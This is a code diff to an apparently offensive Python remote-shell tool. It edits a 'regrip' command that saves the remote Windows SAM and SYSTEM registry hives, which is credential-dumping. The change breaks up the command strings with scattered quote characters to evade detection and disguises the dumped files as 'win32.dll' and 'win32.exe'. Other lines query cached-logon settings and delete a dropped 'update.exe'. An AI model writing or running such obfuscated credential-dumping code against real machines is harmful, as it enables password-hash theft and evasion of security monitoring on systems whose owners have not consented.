@@ -407,6 +407,8 @@ class RemoteShell(cmd.Cmd):
         self.execute_remote('reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT')
         if "10" in self.__outputBuffer:
             logging.info("Default of 10 cached logons")
+            self.__outputBuffer = '' 
+
         else:
             logging.info("Cached Logon Credential Amount")
             if len(self.__outputBuffer.strip('\r\n')) > 0: 
@@ -527,12 +529,12 @@ class RemoteShell(cmd.Cmd):
     def do_regrip(self, s):
         try:
             logging.info("SAM")
-            self.execute_remote(r"reg eˣport HKLM\SAM win32.dll")
+            self.execute_remote(r'reg save "HK"L""M\s""a""m"" win32.dll')
             if len(self.__outputBuffer.strip('\r\n')) > 0:
                 print(self.__outputBuffer)
                 self.__outputBuffer = ''
             logging.info("System")
-            self.execute_remote(r"reg eˣport HKLM\System win32.exe")
+            self.execute_remote(r'reg save "HK"L""M\s""ys""t"em" win32.exe')
             if len(self.__outputBuffer.strip('\r\n')) > 0:
                 print(self.__outputBuffer)
                 self.__outputBuffer = ''
@@ -552,6 +554,7 @@ class RemoteShell(cmd.Cmd):
             self.execute_remote("del update.exe")
         except:
             pass
+
 
     def do_exit(self, s):
         return True
